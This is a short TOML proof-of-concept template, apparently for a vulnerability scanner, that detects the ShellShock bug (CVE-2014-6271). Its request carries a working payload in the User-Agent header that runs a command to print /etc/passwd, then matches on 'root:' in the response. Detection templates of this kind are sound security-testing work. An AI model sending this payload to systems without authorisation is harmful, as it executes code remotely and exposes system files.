[info]
author = "ave"
description = "检测目标是否存在ShellShock漏洞，支持多路径payload和Shellshock环境变量注入，匹配敏感文件泄露"
id = "POC-AVE-2014-0044"
name = "CVE-2014-6271 ShellShock远程代码执行 PoC"
severity = "critical"
tags = ["ave-2014-0044"]
vuln_id = [
    "CVE-2014-6271",
    "AVE-2014-0044",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}{{paths}}"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
